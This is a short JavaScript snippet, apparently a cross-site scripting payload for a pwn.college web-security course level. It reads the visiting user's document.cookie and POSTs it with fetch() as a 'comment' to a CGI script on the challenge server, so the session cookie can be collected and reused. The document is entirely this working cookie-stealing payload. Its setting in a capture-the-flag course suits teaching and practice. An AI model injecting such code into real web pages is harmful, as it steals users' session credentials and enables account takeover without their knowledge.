let formData = new FormData(); 
let cookie = document.cookie;
formData.append('comment', cookie);
fetch('http://cse545-web.pwn.college/~level07/cgi-bin/comment.py', { method: 'POST', body: formData, headers: {cookie: cookie}});
